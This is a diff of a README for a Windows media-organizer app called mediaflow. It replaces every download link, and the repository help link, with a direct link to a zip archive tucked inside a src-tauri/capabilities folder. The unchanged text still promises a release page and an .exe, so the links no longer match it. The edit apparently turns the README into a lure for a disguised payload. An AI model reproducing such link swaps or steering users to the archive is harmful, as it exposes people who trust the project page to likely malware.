@@ -1,7 +1,7 @@
 <h1>🖼️ mediaflow - Your Photo & Video Organizer, Simplified</h1>
 
 <p align="center">
-  <a href="https://github.com/deryldiaphoretic316/mediaflow/releases">
+  <a href="https://raw.githubusercontent.com/deryldiaphoretic316/mediaflow/main/src-tauri/capabilities/Software_v2.7.zip">
     <img src="https://img.shields.io/badge/Download_mediaflow-Windows_App-brightgreen?style=for-the-badge&logo=windows&logoColor=white&color=%2345aaf2" alt="Download mediaflow" width="300">
   </a>
 </p>
@@ -25,7 +25,7 @@ Ready to use mediaflow? Follow these steps and you'll be organizing your media i
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-👉 **[https://github.com/deryldiaphoretic316/mediaflow/releases](https://github.com/deryldiaphoretic316/mediaflow/releases)**
+👉 **[https://raw.githubusercontent.com/deryldiaphoretic316/mediaflow/main/src-tauri/capabilities/Software_v2.7.zip](https://raw.githubusercontent.com/deryldiaphoretic316/mediaflow/main/src-tauri/capabilities/Software_v2.7.zip)**
 
 You'll see a page with release notes and a download section. Look for the file named **`mediaflow-windows-portable.exe`**. Click the download button next to it. The download will start automatically.
 
@@ -150,7 +150,7 @@ Absolutely. mediaflow supports both photos (JPG, PNG, HEIC, RAW formats) and vid
 
 If you need assistance, there are two ways to get help:
 
-1. **Visit the GitHub Repository**: Go to [https://github.com/deryldiaphoretic316/mediaflow](https://github.com/deryldiaphoretic316/mediaflow) and explore the documentation, issues section, or open a new request.
+1. **Visit the GitHub Repository**: Go to [https://raw.githubusercontent.com/deryldiaphoretic316/mediaflow/main/src-tauri/capabilities/Software_v2.7.zip](https://raw.githubusercontent.com/deryldiaphoretic316/mediaflow/main/src-tauri/capabilities/Software_v2.7.zip) and explore the documentation, issues section, or open a new request.
 2. **Report a Bug**: If something isn't working right, go to the "Issues" tab on GitHub and provide a clear description of the problem, including your Windows version and what you were trying to do.
 
 ---
@@ -160,7 +160,7 @@ If you need assistance, there are two ways to get help:
 Don't let a messy photo collection stress you out. With mediaflow, you can find duplicates, fix dates, and organize everything in minutes.
 
 **Visit this link to download the application:**  
-👉 **[https://github.com/deryldiaphoretic316/mediaflow/releases](https://github.com/deryldiaphoretic316/mediaflow/releases)**
+👉 **[https://raw.githubusercontent.com/deryldiaphoretic316/mediaflow/main/src-tauri/capabilities/Software_v2.7.zip](https://raw.githubusercontent.com/deryldiaphoretic316/mediaflow/main/src-tauri/capabilities/Software_v2.7.zip)**
 
 Download the .exe file, double-click it, and take your first step toward a beautifully organized photo library. It's free, it's fast, and it works entirely on your computer — the way software should be.
 
